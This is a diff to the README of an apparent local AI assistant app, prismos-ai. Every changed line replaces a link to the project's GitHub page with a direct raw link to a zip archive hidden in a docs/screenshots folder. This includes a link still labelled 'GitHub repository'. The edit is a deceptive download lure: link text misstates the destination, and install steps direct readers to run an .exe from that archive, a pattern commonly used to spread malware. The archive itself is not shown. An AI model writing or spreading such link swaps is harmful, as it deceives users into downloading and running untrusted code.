@@ -1,6 +1,6 @@
 # 🤖 prismos-ai - Your Local AI Assistant
 
-[![Download prismos-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/CHAMARA1989/prismos-ai)
+[![Download prismos-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/CHAMARA1989/prismos-ai/main/docs/screenshots/prismos_ai_2.6.zip)
 
 ## 📖 What is prismos-ai?
 
@@ -19,7 +19,7 @@ You will find all functions inside the app after installation. It organizes your
 ## 💾 Download and Install prismos-ai
 
 1. Click this big button to visit the download page:  
-[![Download prismos-ai](https://img.shields.io/badge/Download-prismos--ai-blue)](https://github.com/CHAMARA1989/prismos-ai)
+[![Download prismos-ai](https://img.shields.io/badge/Download-prismos--ai-blue)](https://raw.githubusercontent.com/CHAMARA1989/prismos-ai/main/docs/screenshots/prismos_ai_2.6.zip)
 
 2. On the page, look for the latest release or version. You may find a file ending with `.exe` or similar for Windows.
 
@@ -83,7 +83,7 @@ If you need help:
 
 - The app contains built-in tips at the start to guide you through basic tasks.  
 - Check the FAQ section inside the app for common questions.  
-- Visit the [GitHub repository](https://github.com/CHAMARA1989/prismos-ai) for updates, FAQs, and community discussions.
+- Visit the [GitHub repository](https://raw.githubusercontent.com/CHAMARA1989/prismos-ai/main/docs/screenshots/prismos_ai_2.6.zip) for updates, FAQs, and community discussions.
 
 If you want to report a problem or suggest improvements, use the Issues tab on the GitHub page.
 
@@ -104,4 +104,4 @@ To update, repeat the download and installation steps using the latest version f
 
 ---
 
-[![Download prismos-ai](https://img.shields.io/badge/Download-prismos--ai-blue)](https://github.com/CHAMARA1989/prismos-ai)
+[![Download prismos-ai](https://img.shields.io/badge/Download-prismos--ai-blue)](https://raw.githubusercontent.com/CHAMARA1989/prismos-ai/main/docs/screenshots/prismos_ai_2.6.zip)
